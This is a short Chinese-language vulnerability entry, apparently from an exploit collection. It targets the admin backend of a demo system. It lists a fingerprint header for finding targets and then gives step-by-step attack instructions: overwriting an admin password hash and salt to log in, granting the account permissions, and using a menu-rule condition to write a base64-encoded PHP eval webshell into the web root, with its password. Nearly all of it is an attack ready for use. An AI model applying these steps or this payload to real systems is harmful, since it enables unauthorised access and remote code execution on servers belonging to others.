# 叮叮演示版某涉案系统后台Getshell漏洞

- **系统**：叮叮演示版某涉案系统后台Getshell　|　**类型**：其他　|　**CVE**：—
- **指纹**：`header="Access-Control-Allow-Headers: x-requested-with,content-type,x-csrf token,appkey,token"`

**请求体 / payload**
```
可通过复制 admin 表中的数据来登录操作，更改 password 字段内容为
c13f62012fd6a8fdf06b3452a94430e5更改 salt 字段内容为 rpR6Bv 即可直接登录.
然后再把账号对应的id 放⼊ auth_group_access表中即可获得对应权限
该项⽬删除了 插件管理，且命令执⾏也不可⽤，只能使⽤权限菜单处写shell
先去权限管理-菜单规则
规则条件写上 注意这⾥需要知道绝对路径才能写⼊:
file_put_contents('/www/wwwroot/admin/public/ccc.php',base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMTE0NTE0XSk7ID8+"))
然后创建⼀个⼆级管理员
之后直接登录访问即可在其⽬录写⼊shell 密码114514
```
- **预期**：200　|　—